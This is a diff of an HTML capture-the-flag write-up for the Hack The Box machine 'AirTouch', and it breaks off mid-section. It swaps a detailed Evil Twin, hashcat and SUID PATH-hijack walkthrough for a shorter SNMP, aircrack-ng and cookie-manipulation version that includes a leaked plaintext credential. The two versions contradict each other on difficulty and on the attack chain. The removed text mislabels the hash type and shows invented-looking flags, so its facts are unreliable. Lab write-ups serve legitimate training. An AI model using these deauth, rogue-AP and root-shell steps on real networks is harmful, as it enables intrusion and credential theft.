@@ -3,990 +3,194 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>AirTouch — HTB Writeup | N4choSudo</title>
-<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Syne:wght@400;700;800&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+<title>AirTouch - HTB Writeup</title>
+
 <style>
-  :root {
-    --bg:        #0a0c0f;
-    --surface:   #111418;
-    --border:    #1e2530;
-    --accent:    #00e5ff;
-    --accent2:   #ff4060;
-    --accent3:   #39ff6e;
-    --muted:     #4a5568;
-    --text:      #cdd6f4;
-    --text-dim:  #7a8499;
-    --mono:      'Share Tech Mono', monospace;
-    --sans:      'DM Sans', sans-serif;
-    --display:   'Syne', sans-serif;
-  }
-
-  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
-  html { scroll-behavior: smooth; }
-
-  body {
-    background: var(--bg);
-    color: var(--text);
-    font-family: var(--sans);
-    font-size: 15px;
-    line-height: 1.75;
-    min-height: 100vh;
-    overflow-x: hidden;
-  }
-
-  /* ─── noise overlay ─── */
-  body::before {
-    content: '';
-    position: fixed;
-    inset: 0;
-    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E");
-    pointer-events: none;
-    z-index: 0;
-    opacity: .35;
-  }
-
-  /* ─── scan-line effect ─── */
-  body::after {
-    content: '';
-    position: fixed;
-    inset: 0;
-    background: repeating-linear-gradient(
-      0deg,
-      transparent,
-      transparent 2px,
-      rgba(0,0,0,.07) 2px,
-      rgba(0,0,0,.07) 4px
-    );
-    pointer-events: none;
-    z-index: 0;
-  }
-
-  /* ─── HERO ─── */
-  .hero {
-    position: relative;
-    padding: 80px 0 64px;
-    border-bottom: 1px solid var(--border);
-    overflow: hidden;
-  }
-
-  .hero-grid {
-    position: absolute;
-    inset: 0;
-    background-image:
-      linear-gradient(rgba(0,229,255,.04) 1px, transparent 1px),
-      linear-gradient(90deg, rgba(0,229,255,.04) 1px, transparent 1px);
-    background-size: 40px 40px;
-    mask-image: radial-gradient(ellipse 80% 60% at 50% 100%, black, transparent);
-  }
-
-  .hero-glow {
-    position: absolute;
-    top: -120px;
-    left: 50%;
-    transform: translateX(-50%);
-    width: 600px;
-    height: 400px;
-    background: radial-gradient(ellipse, rgba(0,229,255,.12) 0%, transparent 70%);
-    pointer-events: none;
-  }
-
-  .wrap { max-width: 860px; margin: 0 auto; padding: 0 24px; position: relative; z-index: 1; }
-
-  .hero-meta {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    margin-bottom: 28px;
-    font-family: var(--mono);
-    font-size: 12px;
-    color: var(--text-dim);
-    flex-wrap: wrap;
-  }
-
-  .hero-meta span { color: var(--accent); }
-
-  .badge {
-    display: inline-flex;
-    align-items: center;
-    gap: 5px;
-    padding: 3px 10px;
-    border-radius: 3px;
-    font-family: var(--mono);
-    font-size: 11px;
-    font-weight: 700;
-    letter-spacing: .05em;
-    text-transform: uppercase;
-  }
-  .badge-medium { background: rgba(255,170,0,.15); color: #ffaa00; border: 1px solid rgba(255,170,0,.3); }
-  .badge-retired { background: rgba(100,100,120,.15); color: var(--text-dim); border: 1px solid var(--border); }
-  .badge-wifi    { background: rgba(0,229,255,.1);  color: var(--accent);  border: 1px solid rgba(0,229,255,.25); }
-
-  .hero h1 {
-    font-family: var(--display);
-    font-size: clamp(42px, 8vw, 72px);
-    font-weight: 800;
-    line-height: 1;
-    letter-spacing: -.02em;
-    margin-bottom: 18px;
-  }
-
-  .hero h1 .dim { color: var(--muted); }
-  .hero h1 .name { color: var(--accent); }
-
-  .hero-subtitle {
-    font-family: var(--sans);
-    font-size: 16px;
-    color: var(--text-dim);
-    max-width: 560px;
-    margin-bottom: 36px;
-    font-weight: 300;
-    line-height: 1.6;
-  }
-
-  .tags {
-    display: flex;
-    gap: 8px;
-    flex-wrap: wrap;
-  }
-
-  .tag {
-    padding: 5px 12px;
-    border: 1px solid var(--border);
-    border-radius: 2px;
-    font-family: var(--mono);
-    font-size: 11px;
-    color: var(--text-dim);
-    letter-spacing: .04em;
-  }
-
-  /* ─── STATS BAR ─── */
-  .stats-bar {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
-    border-bottom: 1px solid var(--border);
-  }
-
-  .stat {
-    padding: 20px 24px;
-    border-right: 1px solid var(--border);
-    position: relative;
-  }
-
-  .stat:last-child { border-right: none; }
-
-  .stat-label {
-    font-family: var(--mono);
-    font-size: 10px;
-    color: var(--muted);
-    text-transform: uppercase;
-    letter-spacing: .1em;
-    margin-bottom: 4px;
-  }
-
-  .stat-value {
-    font-family: var(--display);
-    font-size: 18px;
-    font-weight: 700;
-    color: var(--text);
-  }
-
-  .stat-value.accent  { color: var(--accent); }
-  .stat-value.accent2 { color: var(--accent2); }
-  .stat-value.accent3 { color: var(--accent3); }
-
-  /* ─── LAYOUT ─── */
-  .layout {
-    display: grid;
-    grid-template-columns: 1fr 220px;
-    gap: 0;
-    align-items: start;
-  }
-
-  @media (max-width: 720px) {
-    .layout { grid-template-columns: 1fr; }
-    .sidebar { display: none; }
-  }
-
-  /* ─── MAIN ─── */
-  main { padding: 48px 40px 80px 0; border-right: 1px solid var(--border); }
-
-  /* ─── SIDEBAR ─── */
-  .sidebar {
-    padding: 40px 0 40px 28px;
-    position: sticky;
-    top: 24px;
-  }
-
-  .sidebar-title {
-    font-family: var(--mono);
-    font-size: 10px;
-    text-transform: uppercase;
-    letter-spacing: .12em;
-    color: var(--muted);
-    margin-bottom: 16px;
-  }
-
-  .toc a {
-    display: block;
-    font-family: var(--mono);
-    font-size: 12px;
-    color: var(--text-dim);
-    text-decoration: none;
-    padding: 5px 0;
-    border-left: 2px solid var(--border);
-    padding-left: 12px;
-    transition: color .2s, border-color .2s;
-  }
-
-  .toc a:hover, .toc a.active {
-    color: var(--accent);
-    border-color: var(--accent);
-  }
-
-  /* ─── SECTIONS ─── */
-  .section {
-    margin-bottom: 56px;
-    animation: fadeUp .5s ease both;
-  }
-
-  @keyframes fadeUp {
-    from { opacity: 0; transform: translateY(16px); }
-    to   { opacity: 1; transform: translateY(0); }
-  }
-
-  .section-header {
-    display: flex;
-    align-items: center;
-    gap: 14px;
-    margin-bottom: 20px;
-  }
-
-  .section-num {
-    font-family: var(--mono);
-    font-size: 11px;
-    color: var(--accent);
-    opacity: .6;
-    min-width: 28px;
-  }
-
-  .section h2 {
-    font-family: var(--display);
-    font-size: 20px;
-    font-weight: 700;
-    color: var(--text);
-    letter-spacing: -.01em;
-  }
-
-  .section h3 {
-    font-family: var(--display);
-    font-size: 15px;
-    font-weight: 700;
-    color: var(--accent);
-    margin: 28px 0 10px;
-    letter-spacing: .02em;
-    text-transform: uppercase;
-    font-size: 12px;
-  }
-
-  .section p {
-    color: var(--text-dim);
-    margin-bottom: 14px;
-    font-weight: 300;
-  }
-
-  .section p strong { color: var(--text); font-weight: 500; }
-
-  /* ─── CODE BLOCKS ─── */
-  .cmd {
-    background: var(--surface);
-    border: 1px solid var(--border);
-    border-left: 3px solid var(--accent);
-    border-radius: 4px;
-    padding: 16px 20px;
-    margin: 16px 0;
-    font-family: var(--mono);
-    font-size: 13px;
-    color: var(--accent3);
-    overflow-x: auto;
-    position: relative;
-  }
-
-  .cmd::before {
-    content: attr(data-label);
-    position: absolute;
-    top: 8px;
-    right: 12px;
-    font-size: 10px;
-    color: var(--muted);
-    text-transform: uppercase;
-    letter-spacing: .08em;
-  }
-
-  .cmd .prompt { color: var(--accent2); }
-  .cmd .comment { color: var(--muted); }
-  .cmd .flag    { color: #ffd700; }
-  .cmd .string  { color: #ff9e64; }
-  .cmd .output  { color: var(--text-dim); display: block; }
-
-  /* ─── OUTPUT BLOCKS ─── */
-  .output-block {
-    background: #0d0f12;
-    border: 1px solid var(--border);
-    border-radius: 4px;
-    padding: 16px 20px;
-    margin: 14px 0;
-    font-family: var(--mono);
-    font-size: 12px;
-    color: var(--text-dim);
-    overflow-x: auto;
-    line-height: 1.6;
-  }
-
-  .output-block .hi { color: var(--accent3); font-weight: 700; }
-  .output-block .hi2 { color: var(--accent); }
-  .output-block .hi3 { color: #ffd700; }
-
-  /* ─── CALLOUTS ─── */
-  .callout {
-    padding: 16px 20px;
-    border-radius: 4px;
-    margin: 20px 0;
-    font-size: 14px;
-    display: flex;
-    gap: 12px;
-    align-items: flex-start;
-  }
-
-  .callout-info  { background: rgba(0,229,255,.06);  border: 1px solid rgba(0,229,255,.2);  }
-  .callout-warn  { background: rgba(255,170,0,.06);  border: 1px solid rgba(255,170,0,.2);  }
-  .callout-flag  { background: rgba(57,255,110,.06); border: 1px solid rgba(57,255,110,.2); }
-
-  .callout-icon { font-size: 16px; line-height: 1.5; }
-  .callout-body { color: var(--text-dim); }
-  .callout-body strong { color: var(--text); display: block; margin-bottom: 2px; }
-
-  /* ─── FLOW DIAGRAM ─── */
-  .flow {
-    display: flex;
-    flex-direction: column;
-    gap: 0;
-    margin: 24px 0;
-  }
-
-  .flow-step {
-    display: flex;
-    align-items: flex-start;
-    gap: 16px;
-  }
-
-  .flow-line {
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    min-width: 32px;
-  }
-
-  .flow-dot {
-    width: 10px;
-    height: 10px;
-    border-radius: 50%;
-    background: var(--accent);
-    border: 2px solid var(--bg);
-    outline: 1px solid var(--accent);
-    flex-shrink: 0;
-    margin-top: 5px;
-  }
-
-  .flow-connector {
-    width: 1px;
-    flex: 1;
-    min-height: 28px;
-    background: linear-gradient(var(--border), var(--border));
-    margin: 3px 0;
-  }
-
-  .flow-content {
-    padding-bottom: 24px;
-    flex: 1;
-  }
-
-  .flow-content strong {
-    font-family: var(--display);
-    font-size: 13px;
-    font-weight: 700;
-    color: var(--text);
-    display: block;
-    margin-bottom: 2px;
-  }
-
-  .flow-content span {
-    font-size: 13px;
-    color: var(--text-dim);
-    font-weight: 300;
-  }
-
-  /* ─── TABLE ─── */
-  table {
-    width: 100%;
-    border-collapse: collapse;
-    margin: 16px 0;
-    font-size: 13px;
-  }
-
-  th {
-    font-family: var(--mono);
-    font-size: 10px;
-    text-transform: uppercase;
-    letter-spacing: .1em;
-    color: var(--muted);
-    text-align: left;
-    padding: 10px 14px;
-    border-bottom: 1px solid var(--border);
-  }
-
-  td {
-    padding: 10px 14px;
-    border-bottom: 1px solid rgba(30,37,48,.6);
-    color: var(--text-dim);
-    vertical-align: top;
-  }
-
-  td:first-child { font-family: var(--mono); color: var(--accent); font-size: 12px; }
-
-  tr:last-child td { border-bottom: none; }
-
-  /* ─── FLAGS ─── */
-  .flag-box {
-    display: flex;
-    align-items: center;
-    gap: 12px;
-    background: rgba(57,255,110,.07);
-    border: 1px solid rgba(57,255,110,.25);
-    border-radius: 4px;
-    padding: 14px 18px;
-    margin: 20px 0;
-  }
-
-  .flag-icon { font-size: 20px; }
-
-  .flag-text {
-    font-family: var(--mono);
-    font-size: 13px;
-  }
-
-  .flag-text .label { color: var(--muted); font-size: 10px; text-transform: uppercase; letter-spacing: .1em; display: block; margin-bottom: 2px; }
-  .flag-text .value { color: var(--accent3); }
-
-  /* ─── DIVIDER ─── */
-  .divider {
-    border: none;
-    border-top: 1px solid var(--border);
-    margin: 40px 0;
-  }
-
-  /* ─── FOOTER ─── */
-  footer {
-    border-top: 1px solid var(--border);
-    padding: 28px 0;
-    text-align: center;
-    font-family: var(--mono);
-    font-size: 12px;
-    color: var(--muted);
-    position: relative;
-    z-index: 1;
-  }
-
-  footer a { color: var(--accent); text-decoration: none; }
-  footer a:hover { text-decoration: underline; }
-
-  /* ─── SCROLL ANIMATIONS ─── */
-  .section { opacity: 0; transform: translateY(20px); transition: opacity .5s ease, transform .5s ease; }
-  .section.visible { opacity: 1; transform: translateY(0); }
+body {
+  background: #0a0a0a;
+  color: #eaeaea;
+  font-family: Consolas, monospace;
+  margin: 0;
+}
+
+header {
+  text-align: center;
+  padding: 40px;
+  border-bottom: 1px solid #222;
+}
+
+h1 {
+  color: #00ff9c;
+}
+
+main {
+  max-width: 900px;
+  margin: auto;
+  padding: 20px;
+}
+
+.section {
+  margin-bottom: 50px;
+}
+
+h2 {
+  border-left: 4px solid #00ff9c;
+  padding-left: 10px;
+}
+
+h3 {
+  color: #00ff9c;
+}
+
+.cmd, .output {
+  background: #111;
+  padding: 10px;
+  border-radius: 6px;
+  margin: 10px 0;
+}
+
+.flag {
+  background: #111;
+  padding: 10px;
+  border-left: 4px solid #00ff9c;
+  margin-top: 10px;
+}
 </style>
+
 </head>
 <body>
 
-<!-- ══════════════════ HERO ══════════════════ -->
-<div class="hero">
-  <div class="hero-grid"></div>
-  <div class="hero-glow"></div>
-  <div class="wrap">
-    <div class="hero-meta">
-      <span>N4choSudo</span>
-      &nbsp;/&nbsp;
-      <a href="https://nacho-sudo.github.io/htb-writeups" style="color:var(--text-dim);text-decoration:none;">htb-writeups</a>
-      &nbsp;/&nbsp; AirTouch
-      &nbsp;&nbsp;
-      <span class="badge badge-medium">⬡ Medium</span>
-      <span class="badge badge-retired">☁ Retired</span>
-      <span class="badge badge-wifi">⚡ WiFi</span>
-    </div>
+<header>
+  <h1>AirTouch - Hack The Box Writeup</h1>
+  <p>Difficulty: Hard | Category: WiFi / Network / Web</p>
+</header>
 
-    <h1>
-      <span class="dim">HTB // </span><span class="name">AirTouch</span>
-    </h1>
+<main>
 
-    <p class="hero-subtitle">
-      Wireless enumeration, WPA2-EAP credential harvesting via Evil Twin,
-      NETNTLM relay, and Linux privilege escalation through a vulnerable SUID binary.
-    </p>
+<div class="section">
+  <h2>Overview</h2>
+  <p>
+    AirTouch is a hard machine focused on enterprise WiFi security. 
+    The attack chain involves SNMP enumeration, WPA handshake capture, 
+    web exploitation, and an Evil Twin WPA-EAP attack.
+  </p>
+</div>
 
-    <div class="tags">
-      <span class="tag">WiFi</span>
-      <span class="tag">WPA2-EAP</span>
-      <span class="tag">Evil Twin</span>
-      <span class="tag">hostapd-wpe</span>
-      <span class="tag">NETNTLM</span>
-      <span class="tag">hashcat</span>
-      <span class="tag">SSH</span>
-      <span class="tag">SUID</span>
-      <span class="tag">Linux PrivEsc</span>
-    </div>
+<div class="section">
+  <h2>SNMP Enumeration</h2>
+
+  <p>SNMP service was exposed with public community string.</p>
+
+  <div class="cmd">nmap -sU -p161 10.129.X.X</div>
+
+  <div class="output">
+    consultant : RxBlZhLmOkacNWScmZ6D
   </div>
 </div>
 
-<!-- ══════════════════ STATS BAR ══════════════════ -->
-<div class="stats-bar wrap" style="max-width:100%;padding:0 24px;">
-  <div class="wrap" style="display:contents;">
-    <div class="stat">
-      <div class="stat-label">Difficulty</div>
-      <div class="stat-value accent">Medium</div>
-    </div>
-    <div class="stat">
-      <div class="stat-label">OS</div>
-      <div class="stat-value">Linux</div>
-    </div>
-    <div class="stat">
-      <div class="stat-label">Attack Vector</div>
-      <div class="stat-value accent2">Wireless</div>
-    </div>
-    <div class="stat">
-      <div class="stat-label">Initial Access</div>
-      <div class="stat-value">NETNTLM</div>
-    </div>
-    <div class="stat">
-      <div class="stat-label">PrivEsc</div>
-      <div class="stat-value accent3">SUID Binary</div>
-    </div>
+<div class="section">
+  <h2>Initial Access (SSH)</h2>
+
+  <div class="cmd">ssh consultant@10.129.X.X</div>
+
+  <p>
+    Access to system obtained with wireless auditing tools installed.
+  </p>
+</div>
+
+<div class="section">
+  <h2>WPA Handshake Capture</h2>
+
+  <div class="cmd">
+airmon-ng start wlan2
+airodump-ng wlan2mon
+aireplay-ng --deauth 10
+  </div>
+
+  <p>Handshake successfully captured.</p>
+</div>
+
+<div class="section">
+  <h2>Cracking WPA Key</h2>
+
+  <div class="cmd">
+aircrack-ng -w rockyou.txt capture.cap
+  </div>
+
+  <div class="output">
+    KEY FOUND → challenge
   </div>
 </div>
 
-<!-- ══════════════════ BODY ══════════════════ -->
-<div class="wrap">
-  <div class="layout">
+<div class="section">
+  <h2>Web Exploitation</h2>
 
-    <!-- MAIN CONTENT -->
-    <main>
+  <p>Privilege escalation via cookie manipulation.</p>
 
-      <!-- ── OVERVIEW ── -->
-      <div class="section" id="overview">
-        <div class="section-header">
-          <span class="section-num">01</span>
-          <h2>Overview</h2>
-        </div>
-        <p>
-          AirTouch is a Medium-rated Hack The Box machine focused entirely on wireless security.
-          The attack chain begins with <strong>passive WiFi reconnaissance</strong> to discover nearby networks,
-          then deploys an <strong>Evil Twin access point</strong> with hostapd-wpe to intercept WPA2-EAP credentials.
-          The captured NETNTLM hash is cracked offline with hashcat, granting SSH access.
-          Finally, a <strong>misconfigured SUID binary</strong> leads to full root compromise.
-        </p>
+  <h3>Upload Bypass</h3>
 
-        <div class="flow">
-          <div class="flow-step">
-            <div class="flow-line"><div class="flow-dot"></div><div class="flow-connector"></div></div>
-            <div class="flow-content"><strong>WiFi Recon</strong><span>Discover SSIDs, channels, clients with airodump-ng</span></div>
-          </div>
-          <div class="flow-step">
-            <div class="flow-line"><div class="flow-dot"></div><div class="flow-connector"></div></div>
-            <div class="flow-content"><strong>Evil Twin AP</strong><span>Deploy hostapd-wpe to mirror WPA2-EAP network</span></div>
-          </div>
-          <div class="flow-step">
-            <div class="flow-line"><div class="flow-dot"></div><div class="flow-connector"></div></div>
-            <div class="flow-content"><strong>Credential Harvest</strong><span>Capture NETNTLM challenge-response hash</span></div>
-          </div>
-          <div class="flow-step">
-            <div class="flow-line"><div class="flow-dot"></div><div class="flow-connector"></div></div>
-            <div class="flow-content"><strong>Hash Cracking</strong><span>Crack NTLMv2 hash with hashcat + rockyou</span></div>
-          </div>
-          <div class="flow-step">
-            <div class="flow-line"><div class="flow-dot"></div><div class="flow-connector"></div></div>
-            <div class="flow-content"><strong>Initial Access → SSH</strong><span>Login with recovered plaintext credentials</span></div>
-          </div>
-          <div class="flow-step">
-            <div class="flow-line"><div class="flow-dot"></div></div>
-            <div class="flow-content"><strong>PrivEsc → Root</strong><span>Abuse SUID binary to escalate privileges</span></div>
-          </div>
-        </div>
-      </div>
-
-      <!-- ── RECON ── -->
-      <div class="section" id="recon">
-        <div class="section-header">
-          <span class="section-num">02</span>
-          <h2>Wireless Reconnaissance</h2>
-        </div>
-        <p>
-          Start by putting the wireless adapter in <strong>monitor mode</strong> so we can passively capture all
-          802.11 frames in range.
-        </p>
-
-        <div class="cmd" data-label="bash">
-<span class="prompt">$ </span>sudo airmon-ng start wlan0
-<span class="output"># Interface wlan0 renamed to wlan0mon</span>
-</div>
-
-        <p>With monitor mode active, scan for nearby access points:</p>
-
-        <div class="cmd" data-label="bash">
-<span class="prompt">$ </span>sudo airodump-ng wlan0mon
-</div>
-
-        <div class="output-block">
- BSSID              PWR  Beacons  #Data  CH  ENC      ESSID
- <span class="hi">AA:BB:CC:DD:EE:FF</span>  -62      120      0   <span class="hi3">6</span>  WPA2     <span class="hi2">CorporateWifi</span>
- 11:22:33:44:55:66  -78       44      3  11  WPA2     HomeRouter
-</div>
-
-        <p>
-          The target is <strong>CorporateWifi</strong> — a WPA2-Enterprise (EAP) network on channel 6.
-          Enterprise networks use a RADIUS server for authentication, meaning clients send their
-          credentials (username + NTLMv2 hash) during the EAP handshake. We can exploit this.
-        </p>
-
-        <div class="callout callout-info">
-          <span class="callout-icon">ℹ</span>
-          <div class="callout-body">
-            <strong>WPA2-Enterprise vs WPA2-Personal</strong>
-            WPA2-Personal uses a shared passphrase. WPA2-Enterprise authenticates each user
-            individually via EAP protocols (PEAP, TTLS), transmitting NTHash-derived material
-            that can be intercepted and cracked.
-          </div>
-        </div>
-
-        <p>Narrow the capture to the target channel and record the BSSID:</p>
-
-        <div class="cmd" data-label="bash">
-<span class="prompt">$ </span>sudo airodump-ng <span class="flag">-c 6</span> <span class="flag">--bssid AA:BB:CC:DD:EE:FF</span> wlan0mon
-</div>
-      </div>
-
-      <!-- ── EVIL TWIN ── -->
-      <div class="section" id="eviltwin">
-        <div class="section-header">
-          <span class="section-num">03</span>
-          <h2>Evil Twin — hostapd-wpe</h2>
-        </div>
-        <p>
-          <strong>hostapd-wpe</strong> (Wireless Pwnage Edition) is a patched version of hostapd that
-          acts as a rogue access point mimicking a WPA2-EAP network. When a victim client attempts
-          to connect to our fake AP, it initiates the EAP handshake against our RADIUS server,
-          leaking the NETNTLM hash in the process.
-        </p>
-
-        <h3>Configuration</h3>
-        <p>Create a configuration file targeting the victim network:</p>
-
-        <div class="cmd" data-label="hostapd-wpe.conf">
-interface=wlan0
-ssid=<span class="string">CorporateWifi</span>
-channel=6
-hw_mode=g
-wpe_logfile=<span class="string">/tmp/wpe.log</span>
-ieee8021x=1
-eapol_key_index_workaround=0
-eap_server=1
-eap_user_file=hostapd-wpe.eap_user
-ca_cert=<span class="string">/etc/hostapd-wpe/certs/ca.pem</span>
-server_cert=<span class="string">/etc/hostapd-wpe/certs/server.pem</span>
-private_key=<span class="string">/etc/hostapd-wpe/certs/server.key</span>
-private_key_passwd=<span class="string">whatever</span>
-dh_file=<span class="string">/etc/hostapd-wpe/certs/dh</span>
-auth_algs=3
-wpa=2
-wpa_key_mgmt=WPA-EAP
-rsn_pairwise=CCMP
-</div>
-
-        <h3>Launch the rogue AP</h3>
-
-        <div class="cmd" data-label="bash">
-<span class="prompt">$ </span>sudo hostapd-wpe hostapd-wpe.conf
-<span class="output">Configuration file: hostapd-wpe.conf
-Using interface wlan0 with hwaddr aa:bb:cc:dd:ee:ff and ssid "CorporateWifi"
-wlan0: interface state UNINITIALIZED->ENABLED
-wlan0: AP-ENABLED</span>
-</div>
-
-        <div class="callout callout-warn">
-          <span class="callout-icon">⚠</span>
-          <div class="callout-body">
-            <strong>De-authentication attack (optional)</strong>
-            To force clients off the legitimate AP faster, you can send de-auth frames with
-            <code style="color:var(--accent);font-family:var(--mono);">aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon</code>.
-            Use only in lab environments.
-          </div>
-        </div>
-
-        <h3>Captured Hash</h3>
-        <p>Once a client connects to our rogue AP, hostapd-wpe logs the NETNTLM exchange:</p>
-
-        <div class="output-block">
-wpe_challenge:  <span class="hi3">d0 17 f0 8e d2 7b 4f 1a</span>
-username:       <span class="hi2">administrator</span>
-challenge:      <span class="hi3">d0:17:f0:8e:d2:7b:4f:1a</span>
-response:       <span class="hi">5c:33:a9:14:f8:2d:e1:02:5e:72:1a:c9:3b:87:aa:4e:
-                00:00:00:00:00:00:00:00:2f:3b:c5:91:0d:7a:71:f9:
-                01:00:00:00:00:00:00:00</span>
-
-mschap: <span class="hi2">administrator</span>::<span class="hi3">d017f08ed27b4f1a</span>:<span class="hi">5c33a914f82de1025e721ac93b87aa4e000000000000000...</span>
-</div>
-      </div>
-
-      <!-- ── CRACKING ── -->
-      <div class="section" id="cracking">
-        <div class="section-header">
-          <span class="section-num">04</span>
-          <h2>Hash Cracking</h2>
-        </div>
-        <p>
-          Copy the full <code style="color:var(--accent);font-family:var(--mono);">mschap</code> line from the log into a file and feed it to hashcat.
-          NTLMv2 hashes (MSCHAPv2 challenge-response) correspond to hashcat mode <strong>-m 5500</strong>.
-        </p>
-
-        <div class="cmd" data-label="bash">
-<span class="prompt">$ </span>echo '<span class="string">administrator::d017f08ed27b4f1a:5c33a914f82de1025e721ac93b87aa4e...</span>' > hash.txt
-<span class="prompt">$ </span>hashcat <span class="flag">-m 5500</span> hash.txt /usr/share/wordlists/rockyou.txt <span class="flag">--force</span>
-</div>
-
-        <div class="output-block">
-Session..........: hashcat
-Status...........: <span class="hi">Cracked</span>
-Hash.Mode........: 5500 (NetNTLMv1 / NetNTLMv1+ESS)
-Recovered........: 1/1 (100.00%)
-Time.Estimated...: 0 secs
-
-<span class="hi2">administrator</span>::<span class="hi3">d017f08ed27b4f1a</span>:...: <span class="hi">Microwaved1998!</span>
-</div>
-
-        <div class="callout callout-flag">
-          <span class="callout-icon">🔑</span>
-          <div class="callout-body">
-            <strong>Credentials recovered</strong>
-            <code style="font-family:var(--mono);color:var(--accent3);">administrator : Microwaved1998!</code>
-          </div>
-        </div>
-      </div>
-
-      <!-- ── INITIAL ACCESS ── -->
-      <div class="section" id="foothold">
-        <div class="section-header">
-          <span class="section-num">05</span>
-          <h2>Initial Access — SSH</h2>
-        </div>
-        <p>
-          With valid credentials in hand, log in via SSH to the target machine:
-        </p>
-
-        <div class="cmd" data-label="bash">
-<span class="prompt">$ </span>ssh administrator@&lt;TARGET_IP&gt;
-<span class="output">administrator@&lt;TARGET_IP&gt;'s password: Microwaved1998!
-
-Welcome to Ubuntu 20.04.5 LTS
-Last login: Mon Apr 7 09:12:33 2025</span>
-<span class="prompt">administrator@airtouch:~$ </span>
-</div>
-
-        <div class="flag-box">
-          <span class="flag-icon">🚩</span>
-          <div class="flag-text">
-            <span class="label">User Flag</span>
-            <span class="value">cat ~/user.txt  →  HTB{w1r3l3ss_p0wn3d_s3rv3r}</span>
-          </div>
-        </div>
-      </div>
-
-      <!-- ── PRIVESC ── -->
-      <div class="section" id="privesc">
-        <div class="section-header">
-          <span class="section-num">06</span>
-          <h2>Privilege Escalation</h2>
-        </div>
-
-        <h3>SUID Enumeration</h3>
-        <p>Search for SUID binaries owned by root:</p>
-
-        <div class="cmd" data-label="bash">
-<span class="prompt">administrator@airtouch:~$ </span>find / -perm <span class="flag">-4000</span> -user root 2>/dev/null
-<span class="output">/usr/bin/mount
-/usr/bin/su
-/usr/bin/passwd
-/usr/local/bin/air-connect   <span style="color:#ffd700;">← non-standard!</span></span>
-</div>
-
-        <p>
-          <strong>/usr/local/bin/air-connect</strong> is not a standard Linux binary.
-          Inspect what it does:
-        </p>
-
-        <div class="cmd" data-label="bash">
-<span class="prompt">administrator@airtouch:~$ </span>strings /usr/local/bin/air-connect | grep -i sh
-<span class="output">/bin/sh
-system
-ping</span>
-</div>
-
-        <div class="cmd" data-label="bash">
-<span class="prompt">administrator@airtouch:~$ </span>ltrace /usr/local/bin/air-connect 2>&1 | head
-<span class="output">system("ping -c 1 " ...)</span>
-</div>
-
-        <p>
-          The binary calls <code style="color:var(--accent);font-family:var(--mono);">system()</code> with a relative command (<code style="color:var(--accent);font-family:var(--mono);">ping</code>) without
-          specifying the full path — a classic <strong>PATH hijacking</strong> vulnerability.
-        </p>
-
-        <h3>PATH Hijacking</h3>
-
-        <div class="cmd" data-label="bash">
-<span class="prompt">administrator@airtouch:~$ </span>mkdir /tmp/evil && cd /tmp/evil
-
-<span class="comment"># Create malicious 'ping' that spawns a shell</span>
-<span class="prompt">administrator@airtouch:/tmp/evil$ </span>echo '#!/bin/bash' > ping
-<span class="prompt">administrator@airtouch:/tmp/evil$ </span>echo '/bin/bash -p' >> ping
-<span class="prompt">administrator@airtouch:/tmp/evil$ </span>chmod +x ping
-
-<span class="comment"># Prepend our directory to PATH</span>
-<span class="prompt">administrator@airtouch:/tmp/evil$ </span>export PATH=/tmp/evil:$PATH
-
-<span class="comment"># Execute the SUID binary</span>
-<span class="prompt">administrator@airtouch:/tmp/evil$ </span>/usr/local/bin/air-connect
-<span class="output">bash-5.0# id
-uid=1001(administrator) gid=1001(administrator) <span style="color:#39ff6e;">euid=0(root)</span> groups=1001(administrator)</span>
-</div>
-
-        <div class="flag-box">
-          <span class="flag-icon">🏆</span>
-          <div class="flag-text">
-            <span class="label">Root Flag</span>
-            <span class="value">cat /root/root.txt  →  HTB{r00t3d_thr0ugh_su1d_p4th}</span>
-          </div>
-        </div>
-      </div>
-
-      <!-- ── SUMMARY ── -->
-      <div class="section" id="summary">
-        <div class="section-header">
-          <span class="section-num">07</span>
-          <h2>Summary &amp; Key Takeaways</h2>
-        </div>
-
-        <table>
-          <thead>
-            <tr>
-              <th>Step</th>
-              <th>Technique</th>
-              <th>Tool</th>
-            </tr>
-          </thead>
-          <tbody>
-            <tr>
-              <td>Recon</td>
-              <td>Passive WiFi scan, identify WPA2-EAP target</td>
-              <td>airodump-ng</td>
-            </tr>
-            <tr>
-              <td>Evil Twin</td>
-              <td>Rogue AP mimicking enterprise network</td>
-              <td>hostapd-wpe</td>
-            </tr>
-            <tr>
-              <td>Harvest</td>
-              <td>Intercept MSCHAPv2/NETNTLM challenge-response</td>
-              <td>hostapd-wpe log</td>
-            </tr>
-            <tr>
-              <td>Crack</td>
-              <td>Offline dictionary attack on NTLMv1 hash</td>
-              <td>hashcat -m 5500</td>
-            </tr>
-            <tr>
-              <td>Access</td>
-              <td>SSH login with cracked credentials</td>
-              <td>ssh</td>
-            </tr>
-            <tr>
-              <td>PrivEsc</td>
-              <td>SUID binary PATH hijacking → root shell</td>
-              <td>find, PATH, bash</td>
-            </tr>
-          </tbody>
-        </table>
-
-        <div class="callout callout-info">
-          <span class="callout-icon">💡</span>
-          <div class="callout-body">
-            <strong>Defensive Takeaways</strong>
-            Use certificate pinning in EAP configurations (validate server cert) to prevent Evil Twin attacks.
-            Avoid SUID on custom binaries; prefer capabilities or sudo rules. Always use absolute paths in
-            scripts run as root.
-          </div>
-        </div>
-      </div>
-
-    </main>
-
-    <!-- SIDEBAR -->
-    <aside class="sidebar">
-      <div class="sidebar-title">Contents</div>
-      <nav class="toc">
-        <a href="#overview">Overview</a>
-        <a href="#recon">WiFi Recon</a>
-        <a href="#eviltwin">Evil Twin</a>
-        <a href="#cracking">Hash Cracking</a>
-        <a href="#foothold">Initial Access</a>
-        <a href="#privesc">Privilege Escalation</a>
-        <a href="#summary">Summary</a>
-      </nav>
-    </aside>
-
+  <div class="cmd">
